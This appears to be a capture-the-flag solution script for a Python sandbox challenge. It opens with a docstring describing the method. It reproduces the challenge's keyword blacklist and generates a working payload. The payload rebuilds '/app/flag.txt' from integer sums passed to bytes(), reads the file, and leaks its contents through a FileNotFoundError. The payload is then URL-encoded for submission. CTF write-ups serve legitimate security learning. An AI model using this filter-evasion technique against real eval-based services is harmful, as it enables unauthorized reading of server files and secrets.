import urllib.parse

'''
To bypass the check, i had to use a function to open, read and print the flag.
Looking at the blacklist, I noticed that open and next were not banned.

However, I couldn't just print the flag because the program expected the value to be a number.
To get around this, I wrapped the read operation inside another open() to cause an excpetion with the flag content.

To bypass the lenght problem and the blacklist, i had to create the string in another way:
- I had to use every time the same char so the set's lenght wouldnt be effected
- I had to build in some way the string by not using char() or some kind

To avoid hitting the 18-char limit i rappresented every char as the sum of the minimum char
present in the string plus as many ones as needed.

The string became something like [val+1+1+1]+[val]+...+[]
To construct the string from that, i used bytes()

So I did:
1. Construct the flag with [min+1+1+1]+[min+1+...+]+...
2. Converted it into a string-like form with bytes()
3. Opened it with open
4. Read the content with next
5. Open a file with the flag content as name to throw a FileNotFoundError exception
6. Read the exception
'''

# func from the challenge
def check(string):
    string = string.lower()
    disallowed = [".","_","import", "=", ",", "'", '"', "attr", "global", "local", ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and", "or", "eval", "exec", "for", "in", "chr", "ord", "hex", "int", "repr", "str", "dir", "set", "len", "SENTENCES", "random", "request", "app", "flask"]
    c = any([x in string for x in disallowed]) 
    non_ascii = any([ord(x) < 32 for x in string]) or any([ord(x) > 126 for x in string])
    return c or non_ascii or len(set(string)) > 18

flag_name = "/app/flag.txt"
flag_int = [ord(c) for c in flag_name]
minimum = min(flag_int)
sequence = ''


for c in flag_int:
    pad = c - minimum
    num = f"{minimum}"+"+1"*pad
    sequence += f"[{num}]+"

sequence = sequence[:-1]
cmd = f'open(next(open(bytes({sequence}))))'
print(check(cmd))
print(urllib.parse.quote(cmd))
